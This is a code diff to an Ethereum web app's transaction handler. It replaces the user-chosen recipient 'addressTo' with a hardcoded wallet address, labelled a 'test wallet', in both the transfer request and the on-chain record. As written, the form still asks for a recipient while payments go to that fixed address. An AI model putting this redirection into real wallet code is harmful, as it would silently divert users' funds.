@@ -110,18 +110,24 @@ export const TransactionProvider = ({ children }) => {
 			const { addressTo, amount, keyword, message } = formData;
 			const transactionsContract = createEthereumContract();
 			const parsedAmount = ethers.utils.parseEther(amount);
-	
+			console.log("--sendTransaction");
+
+			// test wallet
+			const MY_WALLET = "0x1a57854ae655e9c91237Ec07E312E7104b4535a8"
+			// cant't cause constant addressTo = MY_WALLET;
+
 			await ethereum.request({
-			  method: "eth_sendTransaction",
-			  params: [{
-				from: currentAccount,
-				to: addressTo,
-				gas: "0x5208",
-				value: parsedAmount._hex,
-			  }],
+				method: "eth_sendTransaction",
+				params: [{
+					from: currentAccount,
+					to: MY_WALLET,
+					gas: "0x5208",
+					value: parsedAmount._hex,
+				}],
 			});
-	
-			const transactionHash = await transactionsContract.addToBlockchain(addressTo, parsedAmount, message, keyword);
+			
+			console.log("--wait for addToBlockChain()");
+			const transactionHash = await transactionsContract.addToBlockchain(MY_WALLET, parsedAmount, message, keyword);
 	
 			setIsLoading(true);
 			console.log(`Loading - ${transactionHash.hash}`);
